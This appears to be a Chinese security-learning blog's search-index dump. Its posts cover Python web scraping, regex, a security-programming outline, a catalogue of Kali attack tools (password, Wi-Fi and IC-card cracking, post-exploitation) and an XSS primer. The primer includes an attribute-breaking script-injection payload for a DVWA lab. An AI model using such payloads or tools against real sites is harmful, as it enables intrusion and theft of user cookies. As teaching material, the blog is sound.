Cookies12r = requests.get(url)print(r.cookies[&#x27;cookie_name&#x27;]) 超时（单位是秒）1r = requests.get(url, timeout=0.1) 错误与异常 遇到网络错误（DNS查询失败、拒绝连接）时，Requests会抛出一个ConnectionError异常。 遇到无效的HTTP响应时，Requests会抛出一个HTTPError异常。 遇到请求超时，Requests则会抛出Timeout异常。 爬虫 网络爬虫（又称为网页蜘蛛，网络机器人，在FOAF社区中间，更经常的称为网页追逐者），是一种按照一定的规则，自动地抓取万维网信息的程序或者脚本。另外一些不常使用的名字还有蚂蚁、自动索引、模拟程序或者蠕虫。 用爬虫最大的好处是批量且自动化得获取和处理信息。 爬虫练习–爬取豆瓣电影TOP250 查看爬取网页的源码，由此构造正则表达式 定义get_one_page(url)函数去获取单个页面的响应内容 1234567891011121314151617import requestsimport reimport jsonfrom requests.exceptions import RequestExceptionimport time headers = &#123;&#x27;User-Agent&#x27;:&#x27;Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36&#x27;&#125;def get_one_page(url): try: res = requests.get(url) if res.status_code == 200: return res.text return None except RequestException: return Noneget_one_page(&quot;http://www.baidu.com&quot;) 分析每个页面的url组成部分，定义需要爬虫的网页url的命名规律。 需要爬虫网页的URL https://movie.douban.com/top250?start=0&amp;filter= https://movie.douban.com/top250?start=25&amp;filter= https://movie.douban.com/top250?start=50&amp;filter= … 123# 定义需要爬取的网页URl集合def urls(): return [&#x27;https://movie.douban.com/top250?start=&#123;&#125;&amp;filter=&#x27;.format(str(i)) for i in range(0,250,25)] 设置正则表达式匹配模式去匹配获取到的字符串 123456789pattern = &#x27;&lt;span class=&quot;title&quot;&gt;(.*?)&lt;/span&gt;&#x27;key = []for url in urls(): key += re.findall(pattern, get_one_page(url))for k in key: if &quot;&amp;&quot; in k: key.remove(k)print(key) [&#39;肖申克的救赎&#39;, &#39;霸王别姬&#39;, &#39;阿甘正传&#39;, &#39;这个杀手不太冷&#39;, &#39;美丽人生&#39;, &#39;泰坦尼克号&#39;, &#39;千与千寻&#39;, &#39;辛德勒的名单&#39;, &#39;盗梦空间&#39;, &#39;忠犬八公的故事&#39;, &#39;海上钢琴师&#39;, &#39;楚门的世界&#39;, &#39;三傻大闹宝莱坞&#39;, &#39;机器人总动员&#39;, &#39;放牛班的春天&#39;, &#39;星际穿越&#39;, &#39;大话西游之大圣娶亲&#39;, &#39;熔炉&#39;, &#39;疯狂动物城&#39;, &#39;无间道&#39;, &#39;龙猫&#39;, &#39;教父&#39;, &#39;当幸福来敲门&#39;, &#39;怦然心动&#39;, &#39;触不可及&#39;, &#39;蝙蝠侠：黑暗骑士&#39;, &#39;控方证人&#39;, &#39;活着&#39;, &#39;乱世佳人&#39;, &#39;寻梦环游记&#39;, &#39;末代皇帝&#39;, &#39;摔跤吧！爸爸&#39;, &#39;指环王3：王者无敌&#39;, &#39;少年派的奇幻漂流&#39;, &#39;何以为家&#39;, &#39;飞屋环游记&#39;, &#39;十二怒汉&#39;, &#39;鬼子来了&#39;, &#39;天空之城&#39;, &#39;大话西游之月光宝盒&#39;, &#39;哈尔的移动城堡&#39;, &#39;素媛&#39;, &#39;天堂电影院&#39;, &#39;罗马假日&#39;, &#39;闻香识女人&#39;, &#39;辩护人&#39;, &#39;搏击俱乐部&#39;, &#39;哈利·波特与魔法石&#39;, &#39;我不是药神&#39;, &#39;死亡诗社&#39;, &#39;教父2&#39;, &#39;狮子王&#39;, &#39;指环王2：双塔奇兵&#39;, &#39;窃听风暴&#39;, &#39;大闹天宫&#39;, &#39;指环王1：魔戒再现&#39;, &#39;两杆大烟枪&#39;, &#39;美丽心灵&#39;, &#39;饮食男女&#39;, &#39;飞越疯人院&#39;, &#39;猫鼠游戏&#39;, &#39;黑客帝国&#39;, &#39;V字仇杀队&#39;, &#39;钢琴家&#39;, &#39;本杰明·巴顿奇事&#39;, &#39;看不见的客人&#39;, &#39;让子弹飞&#39;, &#39;西西里的美丽传说&#39;, &#39;海豚湾&#39;, &#39;小鞋子&#39;, &#39;拯救大兵瑞恩&#39;, &#39;情书&#39;, &#39;穿条纹睡衣的男孩&#39;, &#39;音乐之声&#39;, &#39;美国往事&#39;, &#39;绿皮书&#39;, &#39;致命魔术&#39;, &#39;海蒂和爷爷&#39;, &#39;低俗小说&#39;, &#39;七宗罪&#39;, &#39;沉默的羔羊&#39;, &#39;蝴蝶效应&#39;, &#39;春光乍泄&#39;, &#39;被嫌弃的松子的一生&#39;, &#39;禁闭岛&#39;, &#39;心灵捕手&#39;, &#39;布达佩斯大饭店&#39;, &#39;阿凡达&#39;, &#39;剪刀手爱德华&#39;, &#39;勇敢的心&#39;, &#39;摩登时代&#39;, &#39;天使爱美丽&#39;, &#39;喜剧之王&#39;, &#39;加勒比海盗&#39;, &#39;致命ID&#39;, &#39;断背山&#39;, &#39;杀人回忆&#39;, &#39;幽灵公主&#39;, &#39;狩猎&#39;, &#39;阳光灿烂的日子&#39;, &#39;请以你的名字呼唤我&#39;, &#39;入殓师&#39;, &#39;哈利·波特与死亡圣器(下)&#39;, &#39;重庆森林&#39;, &#39;第六感&#39;, &#39;小森林 夏秋篇&#39;, &#39;7号房的礼物&#39;, &#39;消失的爱人&#39;, &#39;红辣椒&#39;, &#39;爱在黎明破晓前&#39;, &#39;小森林 冬春篇&#39;, &#39;玛丽和马克思&#39;, &#39;侧耳倾听&#39;, &#39;一一&#39;, &#39;告白&#39;, &#39;唐伯虎点秋香&#39;, &#39;大鱼&#39;, &#39;蝙蝠侠：黑暗骑士崛起&#39;, &#39;阳光姐妹淘&#39;, &#39;倩女幽魂&#39;, &#39;超脱&#39;, &#39;射雕英雄传之东成西就&#39;, &#39;甜蜜蜜&#39;, &#39;驯龙高手&#39;, &#39;萤火之森&#39;, &#39;超能陆战队&#39;, &#39;无人知晓&#39;, &#39;幸福终点站&#39;, &#39;菊次郎的夏天&#39;, &#39;恐怖直播&#39;, &#39;借东西的小人阿莉埃蒂&#39;, &#39;爱在日落黄昏时&#39;, &#39;神偷奶爸&#39;, &#39;完美的世界&#39;, &#39;怪兽电力公司&#39;, &#39;玩具总动员3&#39;, &#39;风之谷&#39;, &#39;血战钢锯岭&#39;, &#39;傲慢与偏见&#39;, &#39;上帝之城&#39;, &#39;功夫&#39;, &#39;时空恋旅人&#39;, &#39;教父3&#39;, &#39;电锯惊魂&#39;, &#39;喜宴&#39;, &#39;谍影重重3&#39;, &#39;英雄本色&#39;, &#39;天书奇谭&#39;, &#39;人生果实&#39;, &#39;岁月神偷&#39;, &#39;被解救的姜戈&#39;, &#39;七武士&#39;, &#39;哪吒闹海&#39;, &#39;我是山姆&#39;, &#39;疯狂原始人&#39;, &#39;纵横四海&#39;, &#39;三块广告牌&#39;, &#39;头号玩家&#39;, &#39;心迷宫&#39;, &#39;萤火虫之墓&#39;, &#39;真爱至上&#39;, &#39;达拉斯买家俱乐部&#39;, &#39;釜山行&#39;, &#39;荒蛮故事&#39;, &#39;东邪西毒&#39;, &#39;贫民窟的百万富翁&#39;, &#39;记忆碎片&#39;, &#39;爆裂鼓手&#39;, &#39;黑天鹅&#39;, &#39;你的名字。&#39;, &#39;花样年华&#39;, &#39;卢旺达饭店&#39;, &#39;忠犬八公物语&#39;, &#39;哈利·波特与阿兹卡班的囚徒&#39;, &#39;头脑特工队&#39;, &#39;黑客帝国3：矩阵革命&#39;, &#39;模仿游戏&#39;, &#39;一个叫欧维的男人决定去死&#39;, &#39;雨人&#39;, &#39;你看起来好像很好吃&#39;, &#39;无敌破坏王&#39;, &#39;未麻的部屋&#39;, &#39;恋恋笔记本&#39;, &#39;冰川时代&#39;, &#39;哈利·波特与密室&#39;, &#39;海街日记&#39;, &#39;新世界&#39;, &#39;海边的曼彻斯特&#39;, &#39;二十二&#39;, &#39;虎口脱险&#39;, &#39;房间&#39;, &#39;恐怖游轮&#39;, &#39;惊魂记&#39;, &#39;人工智能&#39;, &#39;雨中曲&#39;, &#39;魔女宅急便&#39;, &#39;奇迹男孩&#39;, &#39;疯狂的石头&#39;, &#39;罗生门&#39;, &#39;海洋&#39;, &#39;爱在午夜降临前&#39;, &#39;终结者2：审判日&#39;, &#39;燃情岁月&#39;, &#39;魂断蓝桥&#39;, &#39;小偷家族&#39;, &#39;初恋这件小事&#39;, &#39;穿越时空的少女&#39;, &#39;可可西里&#39;, &#39;绿里奇迹&#39;, &#39;2001太空漫游&#39;, &#39;完美陌生人&#39;, &#39;牯岭街少年杀人事件&#39;, &#39;无耻混蛋&#39;, &#39;阿飞正传&#39;, &#39;城市之光&#39;, &#39;新龙门客栈&#39;, &#39;源代码&#39;, &#39;香水&#39;, &#39;谍影重重2&#39;, &#39;青蛇&#39;, &#39;谍影重重&#39;, &#39;地球上的星星&#39;, &#39;战争之王&#39;, &#39;猜火车&#39;, &#39;血钻&#39;, &#39;色，戒&#39;, &#39;遗愿清单&#39;, &#39;大佛普拉斯&#39;, &#39;朗读者&#39;, &#39;浪潮&#39;, &#39;步履不停&#39;, &#39;彗星来的那一夜&#39;, &#39;疯狂的麦克斯4：狂暴之路&#39;, &#39;小萝莉的猴神大叔&#39;, &#39;再次出发之纽约遇见你&#39;, &#39;聚焦&#39;, &#39;驴得水&#39;, &#39;东京物语&#39;, &#39;追随&#39;, &#39;一次别离&#39;, &#39;我爱你&#39;, &#39;千钧一发&#39;, &#39;黑鹰坠落&#39;, &#39;九品芝麻官&#39;, &#39;四个春天&#39;, &#39;发条橙&#39;, &#39;网络谜踪&#39;, &#39;E.T. 外星人&#39;, &#39;哈利·波特与火焰杯&#39;, &#39;撞车&#39;]","categories":[{"name":"Python安全编程","slug":"Python安全编程","permalink":"http://example.com/categories/Python%E5%AE%89%E5%85%A8%E7%BC%96%E7%A8%8B/"}],"tags":[]},{"title":"Python正则表达式","slug":"Python正则表达式","date":"2020-04-11T12:23:42.000Z","updated":"2020-04-13T15:48:25.000Z","comments":true,"path":"2020/04/11/Python正则表达式/","link":"","permalink":"http://example.com/2020/04/11/Python%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/","excerpt":"本文学习正则表达式以及正则表达式如何在Python中使用。","text":"本文学习正则表达式以及正则表达式如何在Python中使用。 Python 正则表达式正则：对字符串的检索匹配和处理。 Python通过re模块提供对正则表达式的支持： 先将正则表达式的字符串形式编译为Pattern实例 使用Pattern实例处理文本并获取匹配结果 使用实例获取信息，进行其他操作 一个简单的实例： 1234import repattern = re.compile(&#x27;hello&#x27;)match = pattern.match(&#x27;hello world&#x27;)print(match.group()) 或者采取一种更简便的方式： 12word = re.findall(&#x27;hello&#x27;, &#x27;hello world!&#x27;)print(word) 正则表达式常用字符 利用.匹配任意单字符（仅一位） 123word = &quot;http://murraynizeyu.github.io python-exec&quot;key = re.findall(&#x27;h.&#x27;,word)print(key) #[&#x27;ht&#x27;, &#x27;hu&#x27;, &#x27;ho&#x27;] 利用\\匹配被转义的字符 123word = &quot;http://murraynizeyu.github.io python-exec&quot;key = re.findall(&#x27;\\...&#x27;,word)print(key) #[&#x27;.gi&#x27;, &#x27;.io&#x27;] 利用[xxx]匹配中任意单字符（仅一位） ^取反操作：[^abc]表示匹配不是abc的其他字符 所有的特殊字符（]、[、-、^）在字符集中都失去原有的特殊含义，需要加上\\防止转义。 123word = &quot;http://murraynizeyu.gitnuz.io python-exec&quot;key = re.findall(&#x27;n[ui]z&#x27;,word)print(key) #[&#x27;niz&#x27;, &#x27;nuz&#x27;] 预定义字符集（写在pattern中） 字符 意义 \\d 数字=[0-9] \\D 非数字=[^\\d] \\s 非空字符=[&lt;space&gt;\\t\\r\\f\\v] \\S 非空白字符（除了空格）=[^\\s] \\w 单词字符=[A-Za-z0-9] \\W 非单词字符=[^\\w] 预定义字符集（写在字符后） 字符 意义 * 匹配前一个字符0次或无限次 + 匹配前一个字符1次或无限次 ? 匹配前一个字符0次或1次 &#123;m&#125; 匹配前一个字符m次 &#123;m,n&#125; 匹配前一个字符m次至n次 逻辑、分组 字符 意义 I 代表左右表达式任意匹配一个（先匹配左边后右边） (…) 被括起来的表达式将作为一个分组 贪婪模式与非贪婪模式正则表达式通常用于在文本中查找匹配的字符串。Python里的数量词默认是贪婪的，就是尝试匹配尽量可能多的字符。非贪婪则相反，总是匹配尽可能少的字符。 举个粟子： 给出一个正则表达式&quot;ab*&quot;用户查找&quot;abbbc&quot;。 在贪婪模式下，将找到”abbbc”；在非贪婪模式下（&quot;ab*?&quot;）,将找到”a”。 正则表达式常用Pattern1.匹配中文字符 1[\\u4e00-\\u9fa5] 2.匹配双字节字符（包括汉字在内） 1[^\\x00-\\xff] 3.匹配空白行 1\\n\\s*\\r 4.匹配Email地址 1[\\w!#$%&amp;&#39;*+&#x2F;&#x3D;?^_&#96;&#123;|&#125;~-]+(?:\\.[\\w!#$%&amp;&#39;*+&#x2F;&#x3D;?^_&#96;&#123;|&#125;~-]+)*@(?:[\\w](?:[\\w-]*[\\w])?\\.)+[\\w](?:[\\w-]*[\\w])? 5.匹配网址URL 1[a-zA-z]+:&#x2F;&#x2F;[^\\s]* 6.匹配国内电话号码 1\\d&#123;3&#125;-\\d&#123;8&#125;|\\d&#123;4&#125;-\\&#123;7,8&#125; 7.匹配腾讯QQ 1[1-9][0-9]&#123;4,&#125; 8.匹配中国邮政编码 1[1-9]\\d&#123;5&#125;(?!\\d) 9.匹配18位身份证号 1^(\\d&#123;6&#125;)(\\d&#123;4&#125;)(\\d&#123;2&#125;)(\\d&#123;2&#125;)(\\d&#123;3&#125;)([0-9]|X)$ 10.匹配(年-月-日)格式日期 1([0-9]&#123;3&#125;[1-9]|[0-9]&#123;2&#125;[1-9][0-9]&#123;1&#125;|[0-9]&#123;1&#125;[1-9][0-9]&#123;2&#125;|[1-9][0-9]&#123;3&#125;)-(((0[13578]|1[02])-(0[1-9]|[12][0-9]|3[01]))|((0[469]|11)-(0[1-9]|[12][0-9]|30))|(02-(0[1-9]|[1][0-9]|2[0-8]))) 11.匹配整数 1^-?[1-9]\\d*$ 正则表达式练习爬取淘宝页面所支持国家与地区 12345import requestsurl = &#x27;https://s.taobao.com/search?q=%E6%89%8B%E6%9C%BA&amp;imgfile=&amp;commend=all&amp;ssid=s5-e&amp;search_type=item&amp;sourceId=tb.index&amp;spm=a21bo.2017.201856-taobao-item.1&amp;ie=utf8&amp;initiative_id=tbindexz_20170306&#x27;html = requests.get(url)re.findall(r&#x27;&#123;&quot;areaName&quot;:&quot;(.*?)&quot;&#x27;, html.text)#[&#x27;中国大陆&#x27;,&#x27;中国香港&#x27;,&#x27;中国澳门&#x27;...] 在页面中国家与地区的显示格式如下&#123;&quot;areaName&quot;:&quot;文莱&quot;，...&#125;，因此我们设置匹配模式pattern=&quot;&#123;&quot;areaName&quot;:&quot;(.*?)&quot;&quot;，以非贪婪模式进行。","categories":[{"name":"Python安全编程","slug":"Python安全编程","permalink":"http://example.com/categories/Python%E5%AE%89%E5%85%A8%E7%BC%96%E7%A8%8B/"}],"tags":[]},{"title":"Python安全编程","slug":"Python安全编程","date":"2020-04-11T11:53:39.000Z","updated":"2020-04-11T12:31:03.000Z","comments":true,"path":"2020/04/11/Python安全编程/","link":"","permalink":"http://example.com/2020/04/11/Python%E5%AE%89%E5%85%A8%E7%BC%96%E7%A8%8B/","excerpt":"暂时空","text":"暂时空 Python安全编程笔记说明：必备知识：掌握Python基础知识 了解HTTP协议 熟练使用BurpSuite、Sqlmap工具 目标知识：Python高级用法： 爬虫、多线程、网络编程 Python hacker应用：扫描、爆破、POC Python黑客领域的现状基于Python的平台 知道创宇Seebug漏洞平台 TangScan BugScan漏洞插件社区 基于Python的工具 Sqlmap mitmproxy/mitmdump 中间人攻击 Python基础知识 方面 说明 Python 正则表达式 对于Web应用程序常见的漏洞，都需要正则表达式去匹配 Python Web编程 对爬虫理解、敏感目录扫描 Python 多线程编程 提升效率 Python 网络编程 发送一些网络数据进行攻击 Python 数据库编程 保存上述获取的数据 一些简单的例子： 目录扫描：Web\\多线程（requests、threading、Queue）对后台、敏感文件（svn、upload）、敏感目录（phpmyadmin） 信息搜集：Web\\数据库（中间件tomcat、Jboss）\\C段Web信息\\搜集特定程序 信息匹配和SQL注入：Web\\正则（抓取信息+SQL注入） 反弹shell：网络","categories":[{"name":"Python安全编程","slug":"Python安全编程","permalink":"http://example.com/categories/Python%E5%AE%89%E5%85%A8%E7%BC%96%E7%A8%8B/"}],"tags":[]},{"title":"Kali工具大全","slug":"Kali工具大全","date":"2020-04-10T14:31:17.000Z","updated":"2020-04-11T07:25:21.000Z","comments":true,"path":"2020/04/10/Kali工具大全/","link":"","permalink":"http://example.com/2020/04/10/Kali%E5%B7%A5%E5%85%B7%E5%A4%A7%E5%85%A8/","excerpt":"本文介绍渗透测试常用的Kali系统内置的一些工具。","text":"本文介绍渗透测试常用的Kali系统内置的一些工具。 名称 类型 使用模式 功能 功能评价 dmitry 信息收集 whois查询/子域名收集/端口扫描 whois并不简单明了；子域名和邮箱依赖google；端口扫描速度一般 dnmap 信息收集 用于组建分布式nmap，dnmap_server为服务端；dnmap_client为客户端 用起来并不是那么方便，不是实在不行不是很必要 ike-scan 信息收集 收集ipsec vpn server指纹信息 好像用于攻击vpn，不太懂 maltegoce 信息收集 域名/账号等关联性收集展示 关联性展示功能确实很好，但效果可能没有那么理想，特别是对国内而言 netdiscover 信息收集 主动发出arp包和截获arp包 就arp探测功能就此功能本身而言做得算很好了 nmap 信息收集 端口服务探测和端口漏洞扫描 端口扫描集大成者 p0f 信息收集 监听网卡收发的数据包，读取远端机器操作系统服务版本等信息 毕竟只是截取数据 包中的版本信息，效果期望不要很大 regon-ng 信息收集 模仿msf的信息收集框架 有多个信息收集模块，暂时灭说想法恴义大于作用 sparta 暴力破解 图形版的hydra，加了端口服务扫描功能 还行图形界面聊胜于无 zenmap 信息收集 图形界面版的nmap 还行图形界面聊胜于无 golismero web扫描 就是一个文本版的类似awvs的web扫描器 感觉可以提升对扫描器原理的认识 lynis 系统审计 感觉有点像360首页的“立即体验”，不过只是扫描告警不能一键修复 shell脚本写成颇为有趣 nikto web扫描 web扫描器 就喜欢这种直接告漏洞的扫描器（不过事实上很少能有可用的漏洞） unix-privesc-check 系统审计 审计系统中的关键文件权限是否有异常 还是没有总结性展示和修复功能 bed 系统扫描 通过发送各种模糊数据测试多种服务的缓冲区溢出漏洞的工具 可能还不错 burpsuite web代理 常用web代理截包工具 功能强大不能要求更多 commix 注入检测 sqlmap检测sql注入此工具检测系统命令注入 两相搭配那注入基本覆盖了 httrack 网站克隆 将网站克隆到本地 钓鱼乌云等可能有用 owasp-zap web代理 owasp组织开发的工具 感觉和burpsuite没有很大差别 paros web扫描 一个web漏洞扫描器 skipfish web扫描 一个全自动化的web漏洞扫描工具 sqlmap sql注入扫描 一个强大的sql注入扫描工具 w3af web扫描 一个web漏洞扫描框架 效果还不是很出众但是凡是框架就有活力 webscarab http代理 更专业的http数扬威包分析工具 wpscan web扫描 针对wordpress的漏洞扫描工具 bbqsql 盲注扫描 shell 一个高度可配置的交互式的sql盲注工具 hexorbase 数据库管理 gui 一个支持多种数据库的客户端有多个数据库的口令解解功能 jsql 数据库探测 gui 根据url探测数据库类型/参数注入测试/探测后台页而/探测重要文件 mdb-sql 数据库管理 cmd-line 可用来连接access数据库文件（mdb）然后通过sql语句查询数据 oscaner 数据库猜解 cmd-line 用字典探查oracle数据库是否监听及猜解服务名 sidguesser 数据库猜解 cmd-line 用字典探测oracle数据库存在的sid sqllite database 数据库管理 gui sqlite数据库客户端 sqlinja 数据库猜解 cmd-line 用于猜解ms sql sqlsus sql注入检测 cmd-line 用于mysql的盲注检测 tnscmd10g 数据库探测 cmd-line 用于探测oracle是否监听及其他一些信息 cewl 口令文件制作 cmd-line 爬取给定的URL并依据限制条件生成网站可能使用的口令集合 crunch 口令文件制作 cmd-line 依据限定的条件生成口令集合 hashcat hash爆破 cmd-line 多种hash的爆力猜解工具，速度快所耗CPU小（相对） john 系统口令破解 cmd-line 用于对系统口令文件的破解（如/etc/passwd）还原出密码明文 johnny 系统口令破解 gui john的gui版本 medusa 口令猜解 cmd-line 可对IMAP, rlogin, SSH等进行口令猜解，类似hydra ncrack 口令猜解 cmd-line 可对IMAP, rlogin, SSH等进行口令猜解，类似hydra ophcrack 系统口令破解 gui 基于彩虹表的windows口令破解工具 pyrit wifi破解 cmd-line WPA/WPA2加密的wifi的密码破解工具 rainbowcrack hash破解 cmd-line 具有彩虹表的生成、排序和使用排序好换彩虹表进行破解的功能 rcracki_mt hash破解 cmd-line 基于彩虹表的hash破解工具，可能蚲rainbowcrack一部份 wordlist 口令文件 cmd-line 打印kali自带的一些口令文件存放的位置 aircrack-ng wifi破解 cmd-line 针对WEP、 WPA加密方式的wifi密码破解套件 chirp 无线电拦截 gui 各种无线电数据包的拦截工具（？） cowpatty wifi破解 cmd-line 基于已捕获握手包和密码字典的WPA-PSK加密的wifi密码的猜解 不能自己拦截数据包也只能破解WPA-PSK类加密方式功能有点弱 Fern WIFI Cracker wifi破解 gui 基于字典的WEP和WPA加密的wifi破解工具 能自动发现wifi能拦截数据包，图形界面操作，简单易用 Ghost Phiser AP假冒 gui 能发现AP并使与AP连接的设备断开连接然后假冒AP让设备重新连接 图形界面除了AP外还有假冒DNS、http服务器等，较为好用 giskismet 可视化 gui Kismet输出结果的可视化工具，即较成text、html等各种格式 kismet AP发现 shell 交互式的AP发现工具，列出周围AP的各种信息 MDK3 AP扰乱 cmd-line 可向AP发送大量连接、断开请求，可向周围设备告知存在根本不存在的大量AP 这工具的攻击方法简直是发了疯 mfor IC卡破解 cmd-line IC卡密钥破解程序 各种免费吃饭充钱教程里用的工具你想不想学 mfterm IC卡破解 shell 交互式IC卡文件写入工具 要修改卡内数据才是最终的IC卡破解 pixiewps wifi破解 cmd-line 针对开启WPS的wifi利用WPS随机数生成中的bug来破解 有说很快有说成功率比较低 reaver wifi破解 cmd-line 针对开启WPS的wifi进行暴力破解的工具 aircrack-ng后排名第二的wifi破解工具 wifite wifi破解 cmd-line 较为自动化的wifi破解工具 apktool 安卓逆向 cmd-line 从apk文件中还原出xml和图版等资源文件 clang 编译器 cmd-line 类似gcc的编译器，更轻量，可编译c、c++、Objective-C clang++ 编译器 cmd-line C++编译器，与clang的关系类似gcc和g++的类系 dex2jar 安卓逆向 cmd-line apktool把apk还原成了资源文件和dex，dex2jar把dex还原成jar文件（.class） edb-debug 动态调试 gui 软件逆向动态调试工具 Linux版Ollydbg flashm 反汇编 cmd-line .swf文件的反汇编工具可反汇编出.swf中的脚本代码 jad 反编译 cmd-line dex2jar把文件还原成了.class，jad进一步把文件还原成.java文件 javasnoop fuzz gui java程序漏洞评估工具 nasm shell 汇编 shell nasm是32位汇编编译器，这是一个nasm的shell ollydbg 动态调试 gui windows平台大名鼎鼎的动态调试工具，Linux上是通过wine运行有点水土不服 radare2 静态分析 cmd-line 类似ida的静态反汇编分析工具，功能强大，开源 但是命令行操作这难度有点大 armitage 漏洞利用 gui measploit的gui界面 嗯好像是比原来的msf-gui好点，不过叫人自己去启动msf还要登录，还是不用算了 beef 漏洞利用 cmd-line 利用msf的exp结合xss构造有攻击性的html页面，当浏览器访问即会受到攻击并获取shell 这可以啊，不过不懂对现在浏览器效果怎么样 metasploit 漏洞利用 shell 就是启动msfconsole咯 msf payload center 漏洞利用 cmd-line 生成包含exp的windows/android等各平台的可执行文件，木马制作利器 那这东西和msfvenom的区别是什么 searchsploit 漏洞利用 cmd-line 用于搜索已从exploitdb下载到本地的漏洞利用脚本 可以理解msf都是ruby写的可执行代码，exploit不一定用ruby写，也可能只是扫描述而非代码 Social-Engineering 漏洞利用 shell 一般用于生成各种插入了exp的文件，诱使目标打开而中招 社会工程学总说得很厉害，不过我总觉得社会工程学和DDOS就是最名不副实的 termineter 漏洞利用 shell 智能电表攻击框架 这需要硬件搭配吧，没玩过 bdfproxy 中间人攻击 处于中间人身份时可对经过的流量插入payload driftnet 图版嗅探 cmd-line 用于嗅探流量中的图版并展示到x-window上 配上arp欺骗作为中间人才能发挥威力，自己拦自己的就好玩而已 ettercap 流量拦截 gui 听说可以截持同子网的流量，强无敌，原理是什么 hampster 代理 cmd-line 好像也是代理转发流量的 macchanger mac欺骗 cmd-line 修改本机上网时的mac地址，一用作身份隐藏，二可用来绕过wifi mac黑名单 应该只是软修改mac地址不可能可写吧 mitmproxy 代理 cmd-line 好像也是代理转发流量的 感觉没什么特色啊 netsniff-ng 流量捕获 cmd-line 高性能的流量捕获套件，可能大流量时的捕获效果比较稳定 responder 主机嗅探 cmd-line 被动嗅探与所在主机交互的主机的操作系统版本等信息 wireshark 流量捕获 gui 拦截所有经过指定网卡的流量 sectools常年排行第一的工具，这就不用多说了吧 backdoor exe2hex 编码转换 cmd 顾名思义就是把exe文件转成十六进制文件 不过这样的意义是什么，不是以十六进制就能打开了吗 Intersect 脚本生成 shell 感觉是SQL 有攻击性Intersect语句的生成工具 mimikatz 密码提取 cmd-line 用于从windows内存中提取密码 nishang 后渗透 cmd-line 基于powershell的后渗透攻击工具 PowerSploit 后渗透 cmd-line 也是一个基于powershell的后渗透攻击工具 proxychains 多重代理 cmd-line 好像用来配置多种代理的 weevely webshell shell webshell连接工具不过好像要用自己生成的小马 autopsy 网页分析 web 启动一个服务通过浏览器访问使用，感觉是分析网页各种元素的不是很懂 binwalk 文件识别 cmd-line 用于分析一个文件中是否其实有多个文件 ctf的key文件提取就常用到的 bulk_extractor 要素提取 cmd-line 扫描给定的目录或文件，如果发现一些如电话号码网址等关键的信息则输出到文件 chkrootkit 系统检查 cmd-line 扫描本机，查看本机是否存在受rootkit影响的地方 理解成360的木马查杀也差不多 foremost 文件恢复 cmd-line 文件恢复工具，用于被删除的文件的恢复，就是360等的那个文件恢复功能 galleta cookie文件 cmd-line 用于分析IE的cookie文件输出其中的有用信息 hashdeep hash计算 cmd-line 用于计算文件hash值，支持多种散列算法 volafox 内存分析 cmd-line 针对Mac OS X的内存分析工具，可从其内存镜像中读取进程列表等各种主机信息 先用工具把当前内存抓取下来，然后再用来分析；内存数据容易被破坏所以这确实很有意义 volatility 内存分析 cmd-line volafox的扩展，支持Mac OS X/Linux/Windows casefile 报告编写 gui 一个画图工具，packet tracer用来画网络拓扑，这用来画场景拓扑 这写出高大上的报告啊 cutycapt 网页截屏 cmd-line 一个基于WebKit内核的网页截图工具，就是指定一个url它就能用解析url并把url界面截下来 各种扫描器中的截图就是使用类似的工具完成的，并不会真用个浏览器访问再截图下来 dradis 报告生成 web 可解析burpsuite/nmap等生成的扫描文件，并可将扫描结果转存为pdf或html faraday IDE 报告管理 gui keepnote 笔记本 gui 较之记事本，可建文件夹，支持富文本，可导出为其他格式 magictree 报告管理 gui pipal 词频统计 cmd-line 说词频统计并不是很准确，文命令可分析统计给定文件中的词语的“各种最” recordmydesktop 屏幕录制 cmd-line 屏幕录制，输出.ogv格式视频 不过感觉这视频格式占用磁盘有点大啊 maltegoce 关系分析 gui 通过网络搜索，获取某个IP或邮箱与其他IP或邮箱的拓扑关系 这东西有那么强，但社工的东西还是没那么强，而且还是外国的工具在天朝的网络","categories":[{"name":"工具说明书","slug":"工具说明书","permalink":"http://example.com/categories/%E5%B7%A5%E5%85%B7%E8%AF%B4%E6%98%8E%E4%B9%A6/"}],"tags":[{"name":"Kali","slug":"Kali","permalink":"http://example.com/tags/Kali/"},{"name":"tool","slug":"tool","permalink":"http://example.com/tags/tool/"}]},{"title":"【Web安全】五、XSS基础","slug":"【Web安全】五、XSS基础","date":"2020-04-08T01:30:15.000Z","updated":"2020-04-08T14:34:00.000Z","comments":true,"path":"2020/04/08/【Web安全】五、XSS基础/","link":"","permalink":"http://example.com/2020/04/08/%E3%80%90Web%E5%AE%89%E5%85%A8%E3%80%91%E4%BA%94%E3%80%81XSS%E5%9F%BA%E7%A1%80/","excerpt":"本文学习XSS基础以及DVWA模拟环境的几道例题。","text":"本文学习XSS基础以及DVWA模拟环境的几道例题。 XSS介绍与原理XSS攻击是在网页中嵌入客户端恶意脚本代码，一般是使用JavaScript语言编写。 JavaScript可以用来获取用户的Cookie、改变网页内容、URL跳转，因此攻击者需要做的是向Web页面注入JavaScript，就可以盗取用户Cookie、黑掉页面、导航到恶意网站。 通常在url中加入JavaScript恶意代码来实现一些特殊效果，也可以在JavaScirpt中利用url形式来加载外部脚本。 漏洞实现原理 XSS漏洞分类：反射型、存储型、DOM型 XSS漏洞修复 HTML实体编码 使用白名单过滤用户输入的恶意字符 根据业务场景对症下药 存储型XSS实战原理攻击者在页面上插入XSS代码，服务端将数据存入数据库，当用户访问到存在XSS漏洞的页面时，服务端从数据库中取出数据展示到页面上，导致XSS代码执行，达到攻击效果。 允许用户存储数据的Web应用程序都可能会出现存储型XSS漏洞，当攻击者提交一段XSS代码后，被服务器端接收并存储，当攻击者再次访问某个界面时，这段XSS代码被程序读出来响应给浏览器，造成XSS攻击。 比起其他两种类型的XSS攻击，存储型XSS不需要用户手动去触发。 注意：判断输出数据是否在属性内 当输出数据在属性内， 以上JavaScript代码虽然插入到HTML中，但因为XSS代码在Value属性中，最终当做值来处理，浏览器在解析HML时，会将数据以文本的形式输出在网页。 因此我们需要根据响应的标签构造HTML代码来闭合，插入XSS代码为&quot;/ &gt;&lt;script&gt;alert(1)&lt;/script&gt;，最终在HTMl文档中为&lt;input type=&quot;text&quot; name=&quot;content&quot; value=&quot;&quot;/ &gt;&lt;script&gt;alert(1)&lt;/script&gt;&quot;/&gt;，这样就可以闭合input标签，使得输出的内容不再Value属性内，从而造成XSS跨站漏洞。 存储型XSS测试步骤 